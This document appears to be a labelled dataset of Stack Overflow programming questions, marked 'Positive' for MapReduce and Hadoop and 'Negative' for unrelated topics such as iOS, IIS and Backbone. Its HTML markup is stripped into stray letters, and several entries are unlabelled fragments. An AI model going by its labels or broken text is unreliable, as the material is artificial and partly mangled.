Positive 4587 pMy question is that, does the MapReduce framework for example Hadoop implementation, assign the inputs for mappers before mapper job starts or it is done at runtimep  pThat is, assume I have some input codeicode, and machines codem1,m2 .. mkcode. The machines need not to be equally powered, some may have better performance CPU,Memory than other. If the master node splits the inputs to mappers until the mapper task begins, or at least assigns the inputs to particular mapper node, there may be the case that some machines stronger ones could finish their job and wait. However, if the split job is done on the runtime, this problem does not arise. p  pIf you also indicate the overall split mechanism of codeMapReducecode in preMapper phase, I would be happy. p

For each document I have a tag that identify the type of document and links to other documents, however I dont know which kind is the document of the link until the page of the link is reached in the task.p  pIn the Map phase I identify, the links and the kind of the current page and then Emmit as values the information of the links and the current document with his tag to a single reducer, Key NullWritable Value CurrentDocTypeLink.p  pIn the reducer phase it is grouped all the documents by type using the CurrentDocType of the values, and then emit a relation between DocumentLink of only ones that belongs to certain Types.p  pHowever I have a memory issue because all the final step is performed only in one reducer.p  pIt is a way, to perform a grouping task after the map process and before the reduce task for identify all the documents with its tags and then distribute them to different reducers. p  pI mean group all documenttag as CurrentDocType in an ArrayWritable Text. Then emit to reducers as key the CurrentDocLink tuple and as value the ArrayWritable to perform some filtering in the reduce phase in a parallel way.p  pThanks for your helpp

Positive 4587 pI am trying to aggregate session data without a true session key in PySpark. I have data where an individual is detected in an area at a specific time, and I want to aggregate that into a duration spent in each area strongduring a specific visit see below.strongp  pThe tricky part here is that I want to infer the time someone exits each area as the time they are detected in the next area. This means that I will need to use the start time of the next area ID as the end time for any given area ID. Area IDs can also show up more than once for the same individual.p  pI had an implementation of this in MapReduce where I iterate over all rows and aggregate the time until a new AreaID or Individual is detected, then output the record.

Positive 4587 pI am working on a master thesis project which aims at integrating a custom Map Reduce framework with similar MR interface but own implementation and pipeline, with higher level language frameworks as PIG. p  pCurrently, the MR master and workers have been integrated with YARN so that such jobs can be launched on YARN. The framework is written in C and its running OpenCL defined Map and Reduce functions.p  pThe aim is to make the proprietary MR framework available for usage in as many scenarios as possible, maintaining its own pipeline, with minimum changes to the applications or frameworks which employ Hadoop Map Reduce.p  pGiven the large landscape of Hadoop projects I would need some pointers to resources, literature or documentation of how this has been achieved Pig can run on top of Hadoop MR and Spark at least or which options can be considered. I am conducting reading already into YARN, Pig and so on but some pointers would be really helpfulp

Negative 4587 pIm using a Core Data model for my iPhone app. I have been looking for a way to instantiate or use an Entity outside the ManagedObjectContext. This should not be done, I know, Im also more looking for a way to not do that, but get the benefits anyway.p  pMy challenge is that I have a view where the user can search for Persons, all the search results are parsed and put into a Person managedObject then displayed in a list. If the user clicks a Person from the list, then and only then would I like the Person entity to be persisted to the store, however this requires me to delete all the other results so they dont get persisted along with the desired one. Also to the best of my knowledge, if the user decides to quite the app, the store is persisted, potentially with all current search results mixed in with real user datap  pIs there some way I could have a TempPerson NSObject I could use for the search list Without, however, me having to manually pull the 45 attributes from the temp object and manually set them on the managedObjectp  pSort of like NSManagedObject aPersonCorrectlyReturnedFromTheStore  NSManagedObject tempPersonOfJustTypeNSObjectp  pI have seen example code from Apple where they build a temporary store to facilitate undoredo and other stuff on an object that is not yet persisted.

Negative 4587 pI am trying to write to a file on a server web05 from a classic asp site running on Windows 2008 serer on IIS7 webadmin. This fails and web05 logs an anonymous logon attempt during the course of the save operation. p  pWebadmins site is running on an app pool in classic mode with a domain user as the process account. The process account has rights to Trust this user for delegation to any service Kerberos only. The same applies for the web05 and webadmin servers. p  pThe site is using Windows Authentication and the idea is that when I log on the site with my domain user, the rights of my user should define what I am allowed to do in the context of the IIS site. If I turn on Basic Authentication, everything works fine. p  pI have also used setspn.exe to add an SPN for the URL.

Negative 4587 pI came across an interesting issue about client server application design.p  pWe have this browser based management application where it has many users using the system. So obvisously within that application we have an user management module within it.p  pI have always thought having an user table in the database to keep all the login details was good enough.p  pHowever, a senior developer said user management should be done in the database server layer if not then is poorly designed. What he meant was, if a user wants to use the application then a user should be created in the user table AND in the database server as a user account as well.p  pSo if I have 50 users using my applications, then I should have 50 database server user logins.p  pI personally think having just one user account in the database server for this database was enough. Just grant this user with the allowed privileges to operate all the necessary operation need by the application. The users that are interacting with the application should have their user accounts created and managed within the database table as they are more related to the application layer. I dont see and agree there is need to create a database server user account for every user created for the application in the user table.p  pA single database server user should be enough to handle all the query sent by the application.p  pReally hope to hear some suggestions  opinions and whether Im missing something performance or security issuesp  pThank you very much.p

Negative 4587 pMy project is a bistro menu, using PHP and MySQL.

Negative 4587 pIm exploring the options for running a hadoop application on a local system.p  pAs with many applications the first few releases should be able to run on a single node, as long as we can use all the available CPU cores Yes, this is related to a hrefhttpstackoverflow.comquestions3406839runningastandalonehadoopapplicationonmultiplecpucoresthis questiona. The current limitation is that on our production systems we have Java 1.5 and as such we are bound to Hadoop 0.18.3 as the latest release See a hrefhttpstackoverflow.comquestions29905950202apihadoopversionwithjava5this questiona. So unfortunately we cant use a hrefhttpsissues.apache.orgjirabrowseMAPREDUCE1367this new featurea yet.p  pThe first option is to simply run hadoop in pseudo distributed mode. Essentially create a complete hadoop cluster with everything on it running on exactly 1 node.p  pThe downside of this form is that it also uses a full fledged HDFS. This means that in order to process the input data this must first be uploaded onto the DFS ... which is locally stored. So this takes additional transfer time of both the input and output data and uses additional disk space. I would like to avoid both of these while we stay on a single node configuration. p  pSo I was thinking Is it possible to override the fs.hdfs.impl setting and change it from org.apache.hadoop.dfs.DistributedFileSystem into for example org.apache.hadoop.fs.LocalFileSystemp  pIf this works the local hadoop cluster which can ONLY consist of ONE node can use existing files without any additional storage requirements and it can start quicker because there is no need to upload the files. I would expect to still have a job and task tracker and perhaps also a namenode to control the whole thing.p  pHas anyone tried this before Can it work or is this idea much too far off the intended usep  pOr is there a better way of getting the same effect PseudoDistributed operation without HDFSp  pThanks for your insights.p  hr  pEDIT 2p  pThis is the config I created for hadoop 0.18.3 confhadoopsite.xml using the answer provided by bajafresh4life.p  precodeltxml version1.0gt ltxmlstylesheet typetextxsl hrefconfiguration.xslgt  lt Put sitespecific property overrides in this file. gt  ltconfigurationgt   ltpropertygt     ltnamegtfs.default.nameltnamegt     ltvaluegtfileltvaluegt   ltpropertygt    ltpropertygt     ltnamegtmapred.job.trackerltnamegt     ltvaluegtlocalhost33301ltvaluegt   ltpropertygt    ltpropertygt     ltnamegtmapred.job.tracker.http.addressltnamegt     ltvaluegtlocalhost33302ltvaluegt     ltdescriptiongt     The job tracker http server address and port the server will listen on.

A solution implying a conditional searchandreplace over the codebase in future does not look like a good practice, does itp  pEDIT3 Another point about autoptr is that it emisem deprecated, whatever neat it is, so it looks strange to advertise its usage at the interface level.

Therefor I output the data which I receive from readfileexternalurl directly to the client.p  pNow I want to determine the traffic which is caused by readfile.p  pI can determine it by the return value of readfile but only if the client finishs the download. Otherwise the script stops working and the return value of readfile is 0.p  pFirst I tried this codep  precodeoutputs download headers creating streamcontext with request headers for the external download server traffic  readfileurl, false, streamcontext save traffic... codepre  pSave traffic was never called when the client stopt downloading.p  pThen I registered a shutdownfunction with registershutdownfunction which included traffic as global variable to save the traffic.

Negative 4587 pIm just curious if anybody has an idea of how widespread the use of eclipse is in universitiesfaculties around the world. p  pThe reason for which im asking this question is that im under the impression that  netbeans is BY FAR more used in the academic world than eclipse, yet i hear so many great things about eclipse. I would have thought that eclipse should have the upper hand in universities since it also supports swt in addition to swing. And at firstglance OO programming seems to have a greater support  in eclipse than in netbeans.p  pAlso it defines concepts like  extension points for which i cant find equivalents in netbeans.Overall it  seems more oriented towards developing looselycoupled  components.

Negative 4587 pFor a project Im working on, I need to make a custom button that can be dragged and dropped and then have its position saved so that a separate window can be opened with the button in the same position as it was saved at.  The issue right now is top and left, which are supposed to be the 2 main attributes in changingsaving a buttons location.  I specify both attributes in CSS for the button, but when I use firebug, neither left nor top have a value assigned to them.  Furthermore, I specify the height and width of the button in the CSS as well.  My button has the proper dimensions but its height and width values are both empty.  Does anyone know why either of these scenarios could happenp  pI also tried setting the values in javascript, which gave top and left a value but had no effect on the buttons positioning.  The other thing I dont get is that changing the buttons marginLeft and marginTop affects the buttons position, but this is not a legitimate option for positioning the button because i will need to have buttons close to each other, which wont work if they have a margin. So is there a reason that top and left wouldnt have an affect on a buttons positioningp

Originally, my coworker just added views to the subview using the p  precode[self.view addSubviewsomeController.view] codepre  pfrom the current ViewController.  This looks right, but is kind of sluggish.  I wanted to lazily load the views as needed and use the advice I got in this post a hrefhttpstackoverflow.comquestions6847983viewhierarchyiniphonequestionView hierarchy in iPhone questionap  pIt does work faster by just setting the view likep  precodeself.view  someController.view codepre  phowever, the views height is incorrect.

I would think that adding it on my current view, or adding it as a subview would take up the same size, but I must be missing something.  Any help is appreciated.  Thanksp

This can be done either by storing uploaded files outside of the web root or configuring the web server to deny access to the uploads directory.p  pAnother important security measure is to use systemgenerated file names instead of the names supplied by users when storing files on the file system.

Negative 4587 pI have a CMS that stores the URL of a page in the database. The page has a reference to a template, which is just a regular aspx file. Using URL rewriting the request is sent to the  correct aspx file. p  pWe got MVC support almost completed, but there is one problem. Everything in mvc is based on routing, which expects a controller name in the url yes, I know you can set a default controller for urls without a controller name, but all the pages can have different controllers, which makes it hard to support urls of the following formatp  pwww.domain.compagenamep  pFor examplep  pwww.cnn.comaboutthissitep  pwww.cnn.compressreleasenewceoannouncedp  pThe pagename has nothing to do with the controller or the viewaction, its just a urlfriendly version of the page name. p  pSo basically what we would like to do is to take the pagename, find the correct page our system, find the referenced templatecontroller in mvc and set up manual routing for that controller and action. Any ideas on how to do that Or should be just accept that URLs in mvc needs the controller name in most cases p

Negative 4587 pI have a simple question.  In my app, I have a some buttons for navigation inside a codeUIScrollViewcode, which scroll with the content.  This way, when the user enters a text field and the keyboard pops up, the buttons will scroll away for extra space.  However, the buttons dont highlight immediately when I tap on them.  Ive learned that I can eliminate this problem by setting codedelaysContentTouchescode to codeNOcode, but this makes scrolling nearly impossible, because all the codeUITextFieldscode and buttons in the view also highlight immediately, stealing the scroll.p  pI have found a way to only not delay the buttons via a codeUIScrollViewcode subclass, so this is an option, but I was wondering if there is another way.  I generally hate subclassing when it is to fix just one little thing.p

Negative 4587 pI have a code, which captures a given window by PrintWindow function. Specifically I do capture webpages in a browser. This code is tested in a standalone Windows application, and it works ok. The same code is incorporated into NPAPI plugin and loaded into Google Chrome. There problems happen. If Chrome has only one tab, the code works OK. If Chrome has 2 tabs, the code returns black box of expected size. I tested the standalone application and the plugin at the same moment, on the same window handle ChromeRenderWidgetHostHWND. Application does ALWAYS work, the plugin does ALWAYS fail if multiple tabs are open in the browser.p  pId really appreciate, if someone give a clue how to fix this.p  pThanks in advance.p  pemNB.

Negative 4587 pIm using the following system configurationp  hr  pChromium 14.0.835.202 on Ubuntu 11.04 using Backbone 0.5.3p  pA Backbone Router with the following routes and callbacks definedp  precode, routes                      handlerRoot                  , second handlerSecond  codepre  hr  pIn this system Im having the following behaviorp  hr  ol liIf I access the root the home, the handlerRoot is called. OK, it was what I was expecting.li liIf I go to second second, the handlerSecond is called. OK, it was what I was expecting.li liIf Im in root and next I go to second, and once there Im clicking the Back Button, as a result of pushing the Back Button two callbacks are being called first is called handlerSecond, and next handlerRoot.  Here in fact I was expecting that only handlerRoot is called, cause my intention as a user when I pushed the Back Button was to return to the previous page.li liIf Im doing the following path root  second  root  second, and once in second the last one, Im clicking the Back Button, as a result of this pushing are called the following callbacks  First handlerSecond, next  handlerRoot, next handlerSecond, and finally  handlerRoot. Its like all the callbacks associated to the URL paths in the previous history are called in reverse order. Again, my expectaction was only being called handlerRoot for the same reason, Im coming back from second to root, Im not interested in all the history.li ol  hr  pI was watching the Backbone.js code for History and I saw that is using the onhashchange event for the compatible browsers. So, I set manually in the browser console the followingp  hr  precodefunction locationHashChanged                    console.logwindow.location.toString   window.onhashchange  locationHashChanged codepre  hr  pI did the same experiments 1, 2, 3 and 4 with this configuration. Effectively all the URL paths in the previous history were printed in reverse order. For example in 3, when Im pushing the Back Button, first is printed the URL for second, and next is printed the URL for root. So, the Backbone behavior indeed is the onhashchange behavior.p  pMy question isp  pWhich one is the reason of this behavior for what is it useful Cause for example if my callbacks are only switching views, in the example 4, Im switching views four times, when Im really needing to switch the views only one time change the view being presented in second by the view being presented in root.   Is there some way to get this behaviorp  pThanks in advancep

Negative 4587 pI wanted to send along an answer to a question that I had.  I wanted to interact with a view, which is defined in a layout in my res folder, using my phones search button.  Basically making an onSearchListener.  Here I will show an example on how to press a button in your layout with the search button.p  precode    public class SearchIntercept extends Activity              boolean activateSearch              Override         public boolean onKeyDownint keycode, KeyEvent e              switchkeycode                  case KeyEvent.KEYCODESEARCH                     SearchManager mSearch  SearchManagergetSystemServiceContext.SEARCHSERVICE                     onSearchRequested                             activateSearch  true                     mSearch.stopSearch                     return true                           return super.onKeyDownkeycode, e                   Override         public void onCreateBundle savedInstanceState              super.onCreatesavedInstanceState             setContentViewR.layout.searchexample              SearchManager mSearch  SearchManagergetSystemServiceContext.SEARCHSERVICE             final Button button  Button findViewByIdR.id.Button1                 Search Listener             mSearch.setOnCancelListenernew SearchManager.OnCancelListener                   Override                 public void onCancel                                      if activateSearch  ture                     button.setPressedtrue                                     activateSearch  false                                                                                                    codepre  pSo what I do here is grab the key input and then start a search request.  I then cancel that request immediately which allows me to use the OnCancelListener that is built into the SearchManager.  At this point you can take the request and do anything you want with it just like a normal listener.  If you have a different way to do this please let us know in the answers.  Also if I should post this in a different way please let me know, unfortunately Im still a noob.p
Negative 4587 pI am building a mobile app that must work in Blackberry, iPhone and Android phones.  I am building this mobile app in HTML5, CSS and JQuery Mobile.  Then I will use PhoneGap to allow the code to run as a native mobile app for the phone.  The mobile app must be able to work without connection to the internet.

Negative 4587 pstrongThe tldr versionstrong p  pIs there an easy way for an aspx page to push a message to a Windows service wout the service constantly polling a shared resource e.g. database tablep  pstrongThe tlbutIreaditanyway versionstrongp  pIve got an ASP.NET web app that implements a very long running process.  I understand that a common way to sidestep issues due to app pool recycling and requests timing out for example is to create a Windows service to handle the longrunning process outside of IIS.p  pIm comfortable w ASP.NET and Ive built simple windows services before, but I could use some advice on how best to pass messages between the web page and the windows service.p  pThe obvious easy solution is to use a shared database  the web page writes a request to a jobs table and the service monitors that table to know when to process the job.  However, Im not sure thats a good fit for the way my app is used.p  pThe app is basically a hoppedup email newsletter mailer with some caveats that make it slower than your typical SMTP mail merge.  It gets used once every few days, on average, and a typical use case is to send several short email jobs and then one or two long ones.  So the send email code, which is what I want to move the windows service, can take anywhere from a few seconds up to 20 minutes and growing to execute.p  pSo it seems that for the web app to be responsive at the short end of the scale, the service would have to poll the database every couple of seconds so that users arent waiting longer for the job to start than it would take to execute.  But that seems like a lot of useless load on the database for the days at a time when the app isnt used at all.p  pIve seen examples that use System.Diagnostics.Process to let an aspx page run a console application, which seems closer to how my app is actually used if I were to put the mail code in the console app, but I dont think that gets it out from under the IIS process.p  pSo my question boils down to is there an easy way for a web page to push a message to or otherwise provoke a reaction from the windows service wout the windows service constantly polling a shared resource e.g. database table  Or is that constant db polling less of an issue than I think it isp  pFurther details the web app targets the 3.5 framework and is running on an old backwater IIS 6 box.  In my research, Ive run across info on MSMQ, a hrefhttpmsdn.microsoft.comenuslibraryms734677.aspx relnofollowWCFWASa, even a hrefhttpmsdn.microsoft.comenuslibrarykwdt6w2k28vvs.10029.aspx relnofollow.NET Remotinga, but they all feel like overkill and my time budget for this problem leaves me enough time to learn emsomethingem new, but not enough to parse and compare all three or spend too much more time down the google rabbit hole.p  pIm really just looking for a simple lightweight way to move some code out from under the IIS process.p

Negative 4587 pI have a main task to develop a library that I split up to get it more manageable. Basically I have a template class for vectors and matrices, several classes that use these two, the main library that uses all of these classes and a Demo application that uses the library to display the features and test them.p  pThe demo application is a Qtcdt project. The library is a pure cdt project. The vector and matrix class are one cdt project. Each of the other classes have an own cdt project.p  pNow I am mainly developing the library and want to see the results in the demo application. So the main development cycle is to change the source of the library and recompile the demo application.p  pMy problem is How to setup the projects builds to have only to rebuild the files necessary and link them accordingly.p  pMy first approach was to include all the source files of all projects including the library in the demo application. That worked but did not trigger on updated files in the library so I head to clean and build everything again each time. p  pAfter this I thought of building the library statically and then linking it into the source file, while referencing the projects. This triggered recompilation at the right place but it seems that the new binary files were not linked into the executable.p  pBasically the question is How should I arrange all those files to have a clear layout not everything in one project, build the right things and not everything if necessary and link them into the executable in case there were changes.p  pstrongSide notestrong Another problem with project referencing was, that the template classes were compiled in their project which led to distracting error messages.p  pstrongEditstrong To give a better understanding of the directory layoutp  precodeeclipseworkspace     demoapplication        .cproject        .project        main.cpp        somewidget.h        somewidget.cpp        demoapplication.pro        ...     mainlibrary        .cproject        .project        class1header.h        class1implementation.cpp        class2header.h        class2implementation.cpp        ...     ...     vectormatrix        .cproject        .project        vector.h        vector.cpp        matrix.h        matrix.cpp        ... codepre  pEach project depends on the projects beneath it.p

However, to do this Id need to push the images up to Cloudfront. Thisp  pa hrefhttpwww.whoishostingthis.comblog20100630cdnspushvspullhttpwww.whoishostingthis.comblog20100630cdnspushvspullap  pseems to suggest it can be done, but everything else ive seen makes no mention of it. My question is is it possible Or are there any other solutions to this problem that I am missingp
Negative 4587 pSo I have encountered a huge error for an idea I came up with. So I am working on a project, on my main website and we needed to put up a being worked on page, yadayda but I wanted to add the functionality of letting the user send us their email , but after we received that data a pop dialog would show.. But this doesnt work as I would like for it to.p  pSo what I need help with, is actually the PHP and the JavaScript event to make it acknowledge that the message and email was sent, then show the dialog box. Does anyone know how to do this Or maybe at least how to make a dialog show after a user did something, like entered information rather then just clicking a button If anyone can help I would ridiculously appreciate itp

Negative 4587 pIm working with a hrefhttpmink.behat.org relnofollowMinka  a hrefhttpsahi.co.in relnofollowSahia to write a functional test suite for my site.p  pI have a set of tests working through them with Firefox and Chrome, which Im happy with. Theyre running nightly on our Jenkins box, and working well.p  pHowever, because our Jenkins box is a server and ChromeFirefox are GUI apps, I have had to make the tests run on my desktop PC. This is a pain because it means I have to leave it switched on every night, which is bad for environmental and cost reasons. Plus if it has any problems with power or network or software, then the tests fail.p  pSo I would like some advice on switching the tests to use a headless browser on the Jenkins box itself.p  pIt seems I have three options Goutte, Zombie and Phantom unless anyone can recommend another, of course. The following summarises my progress so farp  ul lipemGoutteem This is PHPdriven, so would run inside of Mink, removing the need for Sahi. This sounds great, as the Jenkins box has limited resources, so the less I need to install and run on it the better. However, I need to run JS code as part of the tests, and I understand Goutte isnt capable of this. Does that rule it outpli lipemZombieem Runs under Node.js. Unfortunately, I havent been able to make this work at all. Ive installed Node, NPM and Zombie, but I cant get Mink to recognise it. Can anyone give me some clearer instructions than the Mink site on how to get this runningpli lipemPhantomem Unfortunately, Mink doesnt have a driver for Phantom, so Id have to run it via Sahi. As I said, Id prefer not to have to install Sahi on the Jenkins server, especially as it also needs to run continuously as a server. But it is the only one Ive had any success with so far. Running it under Sahi, I can get my tests to run successfully though not consistenly, which is a worry  it seems to timeout randomly, about one in three times. Can anyone suggest a way to run this without needing Sahi or any other middletier server installed Or if I do need Sahi, can anyone tell me how to configure Jenkins to start Sahi at the begining of the test suite and stop it at the endpli ul  pId really appreciate any advice on how to proceed. None of these options seem to have a clear win, for one reason or another. But functional testing is important, so this must be a solved problem. What is the best solultion for mep  pI know theres also the option of rewriting my scripts in Javascript to talk directly to Zombie or Phantom. Id prefer not to do that, as when they fail I will still need to see them running in Firefox to see whats going wrong, so a crossbrowser interface like Mink is ideal  not to mention the fact that Ive already written the all tests in PHPp  pThanks for any advice.  p

I mean, in Orders table could have records where are from movies of series.p  pI dont know how to maintain this relationship or which could be the best way to implement it. Until I know, I only can create 1 to 1 or 1 to many relationships between 2 tables, not for 3.p  pThanks in advance.p
Negative 4587 pIm working with WIA 2.0 with Delphi XE2. Right now, Im attempting to get a scanner to scan. At first I was using codeCommonDialog.ShowAcquireImagecode which was working fine, except for one thing. I would like to be able to pass in an codeIDevicecode, an codeIDeviceInfocode, or the codeDeviceIdcode in order to skip the device selection dialog. Ive tried enumerating through the codeCommandscode property of the codeIDevicecode, but all I get is Synchonize and Build Device Tree. Neither of those two commands seems to be what Im looking for.p  pIm trying to avoid this dialog boxp  pimg srchttpi.stack.imgur.comdIzXK.png altSelection Dialog Boxp  pBut still show this dialog boxp  pimg srchttpi.stack.imgur.comTXvHX.png altProperties dialog box.p  pIve been able to get close two ways. The first is to just use the codeShowTransfercode method of codeICommonDialogcodep  precodeprocedure TForm1.btnAutoScanClickSender TObject var   lDevice  IDevice   lImage  IImageFile   lCommonDialog  ICommonDialog begin   lDevice  fDeviceManager.DeviceInfos[1].Connect   lCommonDialog  CoCommonDialog.Create   lCommonDialog.ShowDevicePropertieslDevice,false   lImage  IUnknownlCommonDialog.ShowTransferlDevice.Items[1],B96B3CAE072811D39D7B0000F81EF32E,false as IImageFile   lImage.SaveFilectestauto.jpg end codepre  pThis causes both dialogs to be skipped over and a progress bar to be shown. This wont work as is because I still need to show the properties dialog box.p  pThe second way Ive gotten close is to call codeShowAcquireImagecode on an codeICommonDialogcodep  precodeprocedure TForm1.btnScanClickSender TObject const   pngFormat  B96B3CAF072811D39D7B0000F81EF32E   jpegFormat  B96B3CAE072811D39D7B0000F81EF32E var   lImage  IImageFile   lDialog  ICommonDialog begin   lDialog  CoCommonDialog.Create   lImage  lDialog.ShowAcquireImageWIATLB.UnspecifiedDeviceType,WIATLB.GrayscaleIntent,WIATLB.MinimizeSize,     jpegFormat,false,false,false   lImage.SaveFilectestmanual.jpg end codepre  pwhich works exactly how I want it strongifstrong there is only one WIA device connected to the computer. The second I plug my camera phone back into the computer I start getting the Select Device dialog box.p  pMy question  is how can I skip the device selection dialog box while scanning regardless of how many devices are connected to the machine but still show the properties dialog boxp

Negative 4587 pUnder sites in IIS I have made a new node that binds to port 80 and stopped all the other websites nodespools that would otherwise bind to that port.p  pUnder the new node I created an application baz1, so the path the website is on is codehttpMyServerbaz1...codep  pI also have other directoriesapplications under the node I created like baz2, baz3, etc...p  pMy only problem is that the application only runs correctly when it is at the root. So instead of being at codehttpMyServerbaz1code it needs to be at codehttpMyServercodep  pIs there a way to keep all the applications grouped under my new node and have only one run at a time and be run at the root I dont want to put the one Im trying to run under default web site for multiple reasons.p  pIve googled, bingd, and experimented on everything I can think of but cant find a way to change the virtual path of an application so Im hoping someone here knows.p  pThanks everyone and if my question isnt clear let me know and Ill clarify it asapp

Negative 4587 pIve been stuck on this problem for too long, and must ask the almighty Stack. Please forgive the simplicity of the issuep  pI am working on the BowlingGame kata in VisualStudio 2012 in order to practice their version of unit tests. Im in the middle of the refactoring section of Test 2, where I add a vector to my Game class in order to save the number of pins rolled.p  pWhen I added the vector include to my header, however, I got a compiler error In fact, its my unit test class that is throwing the compiler error not my source code.p  pI believe the issue is a conflict between the stdafx.h include in the unit test class and the vector include in the source code header, but Im not sure. It could also be a managednative C issue Ive had to work through a few of those during this exercise.p  pBelow is the compiler error abbreviated, as it just goes on and on and the code for my three files so far. Please let me know what I can do to get past this issue. I am trying to use best practices for this exercise, so if you see anything else that looks fishy, please do let me knowp  precode1gt Build started Project BowlingGameUnitTests, Configuration Debug Win32  1gt  BullseyeCoverage Compile C 8.7.21 Windows License 7978  1gt  Copyright c Bullseye Testing Technology 19902012 1gtCL  Command line warning d9999 changing clrsafe to clr 1gt  BowlingGameTest.cpp 1gtcProgram Files x86Microsoft Visual Studio 11.0VCincludexrefwrap156 warning C4561 fastcall incompatible with the clr option converting to stdcall 1gtcProgram Files x86Microsoft Visual Studio 11.0VCincludexrefwrap156 error C2953 stdResultofltRetstdcall ampvoid,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNilgt  class template has already been defined 1gt          cProgram Files x86Microsoft Visual Studio 11.0VCincludexrefwrap156  see declaration of stdResultofltRetstdcall ampvoid,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNilgt 1gtcProgram Files x86Microsoft Visual Studio 11.0VCincludexrefwrap156 error C2953 stdResultofltRetstdcall void,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNilgt  class template has already been defined 1gt          cProgram Files x86Microsoft Visual Studio 11.0VCincludexrefwrap156  see declaration of stdResultofltRetstdcall void,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNil,stdNilgt codepre  pGame.hp  precodepragma once include ltvectorgt using namespace std  class Game  public     Gamevoid     Gamevoid     void roll int pins      int score  private     int totalScore     vectorltintgt rolls     int currentRoll  codepre  pGame.cppp  precodeinclude stdafx.h include Game.h  GameGamevoid      totalScore  0     currentRoll  0   GameGame void     void Gameroll int pins       totalScore  pins     rolls.pushbackpins   int Gamescore      return totalScore  codepre  pBowlingGameTest.cppp  precodeinclude stdafx.h include ..BowlingGameGame.h  using namespace System using namespace SystemText using namespace SystemCollectionsGeneric using namespace MicrosoftVisualStudioTestToolsUnitTesting  namespace BowlingGameUnitTests      [TestClass]     public ref class BowlingGameTest          private         Game game      public          [TestInitialize]         void MyTestInitialize                       game  new Game                   void rollMany int frames, int pins                        for int i  0 i lt frames i                              gamegtrollpins                                [TestMethod]         void gutterGame                      rollMany20, 0             AssertAreEqualltintgt0, gamegtscore                   [TestMethod]         void testAllOnes                      rollMany20, 1             AssertAreEqualltintgt20, gamegtscore                codepre

Negative 4587 pIve tried looking for an existing question but wasnt sure how to phrase this and this retrieved no results anywhere p  pAnyway, I have a class of Order Items that has different properties. These order items are for clothing, so they will have a size string.p  pBecause I am OCD about these sorts of things, I would like to have the strongelements sorted not by the sizes as alphanumeric values, but by the sizes in a custom order.strongp  pI would also like to not have this custom order hardcoded if possible.p  pTo break it down, if I have a list of these order items with a size in each one, like sop  precode2XL S 5XL M codepre  pWith alphanumeric sorting it would be in this orderp  precode2XL 5XL M S codepre  pBut I would like to sort this list into this order strongemfrom smallest size to largestemstrongp  precodeS M 2XL 5XL codepre  pThe only way I can think of to do this is to have a hardcoded array of the sizes and to sort by their index, then when I need to grab the size value I can grab the size order array[i] value. But, as I said, I would prefer this order not to be hardcoded.p  pThe reason I would like the order to be dynamic is the order items are loaded from files on the hard disk at runtime, and also addedediteddeleted by the user at runtime, and they may contain a size that I havent hardcoded, for example I could hard code all the way from 10XS to 10XL but if someone adds the size 110cm aka a Medium, it will turn up somewhere in the order that I dont want it to, assuming the program doesnt crash and burn.p  pI cant quite wrap my head around how to do this.p

Negative 4587 pI am experiencing some issues with the application. I have a registration form which is post to another page from the controller  this page displays the results of the query from the registration form. On the results page i select a record and it returns me with the  data to the registration page. The user should be able to update the record once its returned or execute a query again.p  pThe problems i am having is when the user is on the registration form and executes a query they are posted to the results page the results page is displayed however the url does not change. The registration url is codehttplocalhost8084crimeTrackcitizenregistration.htmcode when posted to the results page by clicking the query button the url is still codehttplocalhost8084crimeTrackcitizenregistration.htmcode when a record is clickedselected on the results page which has several records the user is posted back to the registration page with the  selected record and it is displayed for the user to now execute an update or a query again, the url is codehttplocalhost8084crimeTrackgetCitizen1985121244.htmcode and the user is now on the registration page.p  pIf i click queryupdate again i am getting an strongHTTP 400 errorstrong and the url is reading codehttplocalhost8084crimeTrackgetCitizencitizenregistration.htmcode and this is not a valid URL mapping in the Controller. I think the url should be  codehttplocalhost8084crimeTrackcitizenregistration.htmcode when the registration page is  requested. I am not sure when the POST from the results page takes the user back to the registration page is the url should be  codehttplocalhost8084crimeTrackgetCitizen1985121244.htmcode the attached number is the citizen number. Under is my code i am not sure if i am doing these calls correctly and i would like an explanation for the results i am getting as well as  a solution to the issues experiencedp  pPages are submitted using strongjquerystrongp  pThis is an example for the registration page and all other pages follow the same patternp  pstrongJScriptstrong p  precodefunction submitPage         document.getElementByIdcitizenRegistration.actioncitizenregistration.htm     document.getElementByIdcitizenRegistration.targetself         document.getElementByIdcitizenRegistration.method  POST     document.getElementByIdcitizenRegistration.submit   codepre  pstrongcitizenregistration.jspstrongp  precodeltDOCTYPE html PUBLIC W3CDTD HTML 4.0ENgt lthtml langengt      ltheadgt         lttitlegtCitizen Registrationlttitlegt  ltheadgt      ltbodygt                           ltdiv idtab1 classdivGroupgt                 ltformform idcitizenRegistration name citizenRegistration commandNamecitizensgt                     ........................                         ltdiv classbuttonsgt                                ltolgt                                 ltligtltinput classbutton idsave typesubmit name userrequest valueSavegt                                     ltinput classbutton idupdate typesubmit name userrequest valueUpdategt                                     ltinput classbutton idquery typesubmit name userrequest valueQuerygt                                 ltligt                         ltformformgt             ltdivgt               ltbodygt lthtmlgt codepre  pstrongcitizenList.jspstrongp  precodeltDOCTYPE htmlgt lthtml langengt  ltheadgt     ltscript typetextjavascriptgt     function submitPagesocialSecurityNumber              document.getElementByIdcitizenList.actiongetCitizen1985121244.htmharded coded for testing         document.getElementByIdcitizenList.targetself             document.getElementByIdcitizenList.method  POST         document.getElementByIdcitizenList.submit         function GetCitizenTypeDescriptioncitizenTypeId                          .ajax         typeGET,         urlgetCitizenTypeDescription.htm,         datacitizenTypeIdcitizenTypeId,         dataType text,                 success function data                .citizenTypeId.eachfunctioni                                ifthis.val  citizenTypeId                     finds parent div                     var parent  this.parent                     search for child element wit class name citizenTypeDesc                     var thisCitizenTypeDesc  parent.children.citizenTypeDesc                                       thisCitizenTypeDesc.textdata                                                   lttitlegtCitizen Search Resultslttitlegt  ltheadgt ltbodygt ltformform idcitizenList name citizenListgt ltdiv id contentgt ltcforEach itemscitizens varcitizengt ltdiv idtablegt         ltdivgt         ltpgtltcanvas classcanvas height240 width320gtltcanvasgt     ltdivgt         ltlabel classcitizenTypeDescgtltlabelgtltbrgt          lta classsocialSecurityNumber hrefcitizen.socialSecurityNumbergtcitizen.fName  citizen.lNameltagt          ltinput typehidden idphoto valuecitizen.photo classphotosgt         ltinput typehidden idsocialSecurityNumber valuecitizen.socialSecurityNumber gt         ltinput typehidden classcitizenTypeId 